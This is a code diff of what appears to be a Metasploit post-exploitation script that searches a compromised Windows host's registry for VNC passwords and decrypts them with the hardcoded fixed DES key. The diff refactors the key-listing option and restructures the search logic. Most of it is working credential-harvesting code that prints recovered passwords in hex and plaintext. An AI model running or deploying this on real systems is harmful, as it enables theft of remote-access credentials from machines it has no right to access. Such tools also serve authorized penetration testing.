@@ -40,6 +40,15 @@ def get_vncpw(session, key)
 	end
 end
 
+def listkeylocations(keys)
+	print_line("\nVNC Registry Key Locations")
+	print_line("--------------------------\n")
+	keys.each { |key|
+		print_line("\t#{key}")
+	}
+	completed
+end
+
 # fixed des key
 fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
 # 5A B2 CD C0 BA DC AF 13
@@ -61,42 +70,31 @@ keytosearch = nil
 	    when "-h"
 			usage
 		when "-l"
-			listkeylocs = true
+			listkeylocations(keys)
 		when "-k"
 			keytosearch = val
 	end
 }
 
-if (args.length == 0 or keytosearch != nil) and (help == 0 and listkeylocs == 0)
-
-	if keytosearch == nil
-		print_status("Searching for VNC Passwords in the registry....")
-		keys.each { |key|
-			vncpw = get_vncpw(session, key)
-			if vncpw
-				vncpw_hextext = vncpw.data.unpack("H*").to_s
-				vncpw_text = Cipher::DES.decrypt fixedkey, vncpw.data
-				print_status("FOUND in #{key} -=> #{vncpw_hextext} => #{vncpw_text}")
-			end
-		}
-	else
-		print_status("Searching in regkey: #{keytosearch}")
-		vncpw = get_vncpw(session, keytosearch)
+if keytosearch == nil
+	print_status("Searching for VNC Passwords in the registry....")
+	keys.each { |key|
+		vncpw = get_vncpw(session, key)
 		if vncpw
 			vncpw_hextext = vncpw.data.unpack("H*").to_s
 			vncpw_text = Cipher::DES.decrypt fixedkey, vncpw.data
-			print_status("FOUND in #{keytosearch} -=> #{vncpw_hextext} => #{vncpw_text}")
-		else
-			print_status("Not found")
+			print_status("FOUND in #{key} -=> #{vncpw_hextext} => #{vncpw_text}")
 		end
-	end
-end
-
-if listkeylocs
-	print_line("\nVNC Registry Key Locations")
-	print_line("--------------------------\n")
-	keys.each { |key|
-		print_line("\t#{key}")
 	}
+else
+	print_status("Searching in regkey: #{keytosearch}")
+	vncpw = get_vncpw(session, keytosearch)
+	if vncpw
+		vncpw_hextext = vncpw.data.unpack("H*").to_s
+		vncpw_text = Cipher::DES.decrypt fixedkey, vncpw.data
+		print_status("FOUND in #{keytosearch} -=> #{vncpw_hextext} => #{vncpw_text}")
+	else
+		print_status("Not found")
+	end
 end
 
